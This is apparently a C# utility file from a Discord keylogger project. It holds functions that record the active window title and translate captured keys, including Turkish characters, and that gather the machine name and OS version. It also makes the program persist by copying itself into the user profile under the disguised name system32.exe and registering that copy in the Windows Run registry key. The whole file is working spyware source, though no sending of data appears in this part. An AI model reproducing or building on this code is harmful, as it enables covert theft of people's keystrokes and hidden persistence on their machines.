using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace THT_Discord_Keylogger
{
    class Utils
    {
        public static string get_active_window_title()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = DLLImports.GetForegroundWindow();

            if (DLLImports.GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }
        public static string key_parser(string key)
        {
            switch (key)
            {
                case "Oem1":
                    return "ş";    
                case "Oem7":
                    return "i";
                case "Oem6":
                    return "ü";
                case "OemQuestion":
                    return "ö";
                case "Oem5":
                    return "ç";
                case "OemPeriod":
                    return ".";
                case "OemMinus":
                    return "-";
                case "Oem8":
                    return "*";
                case "Oemcomma":
                    return ",";
                case "OemOpenBrackets":
                    return "ğ";
                case "I":
                    return "ı";
                case "F":
                    return "f";
            }

            if (key.StartsWith("F") && Char.IsDigit(key.Replace("F", string.Empty).Last<char>()))
            {
                return "[" + key.ToUpperInvariant() + "]";
            }

            if (key.Length != 1)
            {
                return "[" + key.ToUpperInvariant() + "]";
            }

            return key.ToLowerInvariant().Trim();
        }
        public static string get_machine_name()
        {
            return Environment.MachineName;
        }
        public static string get_os_name()
        {
            OperatingSystem os_info = System.Environment.OSVersion;
            string version = os_info.Version.Major.ToString() + "." + os_info.Version.Minor.ToString();
            switch (version)
            {
                case "10.0": return "Windows 10/Server 2016";
                case "6.3": return "Windows 8.1/Server 2012 R2";
                case "6.2": return "Windows 8/Server 2012";
                case "6.1": return "Windows 7/Server 2008 R2";
                case "6.0": return "Windows Server 2008/Vista";
                case "5.2": return "Windows Server 2003 R2/Server 2003/XP 64-Bit Edition";
                case "5.1": return "Windows XP";
                case "5.0": return "Windows 2000";
            }
            return "Unknown";
        }
        public static void add_to_startup()
        {
            string user_folder = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            if (File.Exists(user_folder + "\\.windows\\system32.exe")) return;

            DirectoryInfo di = Directory.CreateDirectory(user_folder + "\\.windows\\");
            di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            di.Attributes = FileAttributes.Directory;

            File.Copy(System.Reflection.Assembly.GetEntryAssembly().Location, user_folder + "\\.windows\\system32.exe");

            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("system32", user_folder + "\\.windows\\system32.exe");

            Console.WriteLine("Added to startup!");
        }
        public static void remove_from_startup()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.DeleteValue("system32", false);
        }
        public static string read_resource(string name)
        {
            // Determine path
            var assembly = Assembly.GetExecutingAssembly();

            using (Stream stream = assembly.GetManifestResourceStream(name))
            using (StreamReader reader = new StreamReader(stream))
            {
                return reader.ReadToEnd();
            }
        }
    }
}
